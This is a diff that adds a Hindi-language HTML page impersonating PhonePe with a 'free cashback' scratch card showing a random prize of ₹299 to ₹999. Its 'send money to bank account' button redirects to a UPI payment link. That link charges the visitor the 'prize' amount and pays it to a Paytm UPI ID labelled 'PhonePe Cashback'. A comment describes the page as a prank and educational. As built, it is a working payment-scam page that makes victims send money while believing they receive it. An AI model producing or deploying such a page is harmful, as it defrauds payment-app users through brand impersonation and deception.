@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhonePe कैशबैक ऑफर</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+        }
+
+        /* हेडर स्टाइल */
+        .header {
+            width: 100%;
+            background-color: white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            box-sizing: border-box;
+        }
+        .menu-icon {
+            font-size: 24px;
+            color: #5f259f;
+            cursor: pointer;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+        .logo {
+            font-size: 22px;
+            font-weight: bold;
+            color: #5f259f;
+            display: flex;
+            align-items: center;
+        }
+        .logo span {
+            background-color: #5f259f;
+            color: white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        /* बैनर */
+        .banner {
+            background: linear-gradient(135deg, #5f259f, #8230c4);
+            color: white;
+            text-align: center;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .sub-banner {
+            background-color: #ffd700;
+            color: black;
+            text-align: center;
+            padding: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            width: 90%;
+            margin-top: 10px;
+            border-radius: 20px;
+        }
+
+        /* स्क्रैच कार्ड कंटेनर */
+        .scratch-container {
+            position: relative;
+            width: 280px;
+            height: 280px;
+            margin: 30px auto;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        }
+
+        /* स्क्रैच कार्ड के पीछे का असली इनाम */
+        .scratch-prize {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: #ffdd00; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1;
+            border: 4px solid #5f259f;
+            box-sizing: border-box;
+            border-radius: 15px;
+        }
+        .phonepe-prize-logo {
+            width: 60px;
+            height: 60px;
+            background-color: #5f259f;
+            border-radius: 50%;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+            border: 3px solid white;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        .prize-status {
+            font-size: 26px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 5px;
+        }
+        .prize-amount {
+            font-size: 42px;
+            font-weight: bold;
+            color: #000;
+        }
+
+        /* पैसे उड़ने वाला एनिमेटेड कैनवास */
+        #money-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 2; 
+            pointer-events: none;
+        }
+
+        /* स्क्रैच करने वाली ऊपर की नीली परत */
+        #scratch-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 3;
+            cursor: pointer;
+            touch-action: none;
+        }
+
+        /* नीचे के स्टेप्स */
+        .next-step {
+            text-align: center;
+            margin: 20px 15px;
+        }
+        .step-title {
+            font-weight: bold;
+            font-size: 16px;
+            color: black;
+            margin: 5px 0;
+        }
+        .step-instruction {
+            font-size: 15px;
+            color: #333;
+            margin: 5px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .arrow {
+            color: #ffa500;
+            font-size: 24px;
+        }
+
+        /* बटन स्टाइल */
+        .action-button {
+            background-color: #5f259f;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            width: 90%;
+            max-width: 350px;
+            box-shadow: 0 4px 10px rgba(95, 37, 159, 0.3);
+            transition: transform 0.2s;
+            text-transform: uppercase;
+            margin-bottom: 30px;
+        }
+        .action-button:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="menu-icon">☰</div>
+        <div class="logo"><span>पे</span> PhonePe</div>
+    </div>
+
+    <div class="banner">
+        🏆 सभी PhonePe यूजर्स के लिए मुफ्त कैशबैक 🏆
+    </div>
+    <div class="sub-banner">
+        इसे पाने के लिए नीचे दिए गए स्क्रैच कार्ड को स्क्रैच करें।
+    </div>
+
+    <div class="scratch-container">
+        <div class="scratch-prize">
+            <div class="phonepe-prize-logo">पे</div>
+            <div class="prize-status">आपने जीता</div>
+            <div class="prize-amount" id="prize-display">₹ 299</div>
+        </div>
+        
+        <canvas id="money-canvas" width="280" height="280"></canvas>
+        
+        <canvas id="scratch-canvas" width="280" height="280"></canvas>
+    </div>
+
+    <div class="next-step">
+        <div class="step-title">अगला कदम:</div>
+        <div class="step-instruction">
+            <span class="arrow">➔</span>
+            <strong>अपनी जीती हुई राशि बैंक खाते में भेजने के लिए नीचे क्लिक करें</strong>
+            <span class="arrow">➔</span>
+        </div>
+    </div>
+
+    <button class="action-button" onclick="sendToAccount()">
+        पैसे बैंक खाते में भेजें
+    </button>
+
+    <script>
+        const canvas = document.getElementById('scratch-canvas');
+        const ctx = canvas.getContext('2d');
+        
+        const moneyCanvas = document.getElementById('money-canvas');
+        const mCtx = moneyCanvas.getContext('2d');
+        
+        let isDrawing = false;
+        
+        // रैंडम अमाउंट सिलेक्ट करना
+        const amounts = [299, 399, 499, 999];
+        const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+        document.getElementById('prize-display').innerText = `₹ ${randomAmount}`;
+
+        // नीली परत को ड्रा करना
+        function initCanvas() {
+            ctx.fillStyle = '#3b82f6';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 22px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText('यहाँ स्क्रैच करें', canvas.width / 2, 80);
+
+            ctx.font = 'bold 18px Arial';
+            ctx.fillText('अपना', canvas.width / 2, 145);
+
+            ctx.font = 'bold 22px Arial';
+            ctx.fillText('कैशबैक पाएं', canvas.width / 2, 190);
+        }
+
+        initCanvas();
+
+        // --- उड़ने वाले नोटों (Money Confetti) का लॉजिक ---
+        let particles = [];
+        const colors = ['#4CAF50', '#2196F3', '#FFEB3B', '#9C27B0', '#FF5722']; 
+
+        class Particle {
+            constructor(x, y) {
+                this.x = x;
+                this.y = y;
+                this.sizeWidth = Math.random() * 15 + 12; 
+                this.sizeHeight = Math.random() * 8 + 6;   
+                this.speedX = Math.random() * 6 - 3;       
+                this.speedY = Math.random() * -5 - 3;      
+                this.color = colors[Math.floor(Math.random() * colors.length)];
+                this.rotation = Math.random() * 360;
+                this.rotationSpeed = Math.random() * 6 - 3;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                this.speedY += 0.2; 
+                this.rotation += this.rotationSpeed;
+            }
+            draw() {
+                mCtx.save();
+                mCtx.translate(this.x, this.y);
+                mCtx.rotate(this.rotation * Math.PI / 180);
+                mCtx.fillStyle = this.color;
+                mCtx.fillRect(-this.sizeWidth/2, -this.sizeHeight/2, this.sizeWidth, this.sizeHeight);
+                mCtx.strokeStyle = 'rgba(255,255,255,0.6)';
+                mCtx.strokeRect(-this.sizeWidth/2, -this.sizeHeight/2, this.sizeWidth, this.sizeHeight);
+                mCtx.restore();
+            }
+        }
+
+        function animateParticles() {
+            mCtx.clearRect(0, 0, moneyCanvas.width, moneyCanvas.height);
+            for (let i = 0; i < particles.length; i++) {
+                particles[i].update();
+                particles[i].draw();
+                if (particles[i].y > moneyCanvas.height + 20) {
+                    particles.splice(i, 1);
+                    i--;
+                }
+            }
+            requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        // स्क्रैच पोजीशन कैलकुलेट करना
+        function getCoordinates(e) {
+            const rect = canvas.getBoundingClientRect();
+            if (e.touches && e.touches[0]) {
+                return {
+                    x: e.touches[0].clientX - rect.left,
+                    y: e.touches[0].clientY - rect.top
+                };
+            }
+            return {
+                x: e.clientX - rect.left,
+                y: e.clientY - rect.top
+            };
+        }
+
+        function scratch(e) {
+            if (!isDrawing) return;
+            e.preventDefault();
+            const coords = getCoordinates(e);
+
+            // नीले पेंट को काटना
+            ctx.globalCompositeOperation = 'destination-out';
+            ctx.beginPath();
+            ctx.arc(coords.x, coords.y, 25, 0, Math.PI * 2); 
+            ctx.fill();
+
+            // स्क्रैच वाली जगह से नए नोट उड़ाना
+            for(let i = 0; i < 3; i++) {
+                particles.push(new Particle(coords.x, coords.y));
+            }
+        }
+
+        // माउस इवेंट्स
+        canvas.addEventListener('mousedown', (e) => { isDrawing = true; scratch(e); });
+        canvas.addEventListener('mousemove', scratch);
+        window.addEventListener('mouseup', () => isDrawing = false);
+
+        // मोबाइल टच इवेंट्स
+        canvas.addEventListener('touchstart', (e) => { isDrawing = true; scratch(e); });
+        canvas.addEventListener('touchmove', scratch);
+        window.addEventListener('touchend', () => isDrawing = false);
+
+        // बटन क्लिक एक्शन (प्रैंक और एजुकेशनल रीडायरेक्शन)
+        function sendToAccount() {
+            alert(`बधाई हो! आपका ₹${randomAmount} का कैशबैक बैंक खाते में ट्रांसफर किया जा रहा है...`);
+            
+            // UPI ID paytm.s30zb8z@pty पर रीडायरेक्ट करने का लिंक
+            const upiUrl = `upi://pay?pa=paytm.s30zb8z@pty&pn=PhonePe%20Cashback&am=${randomAmount}&cu=INR&tn=Cashback%20Reward`;
+            
+            window.location.href = upiUrl;
+        }
+    </script>
+</body>
+</html>
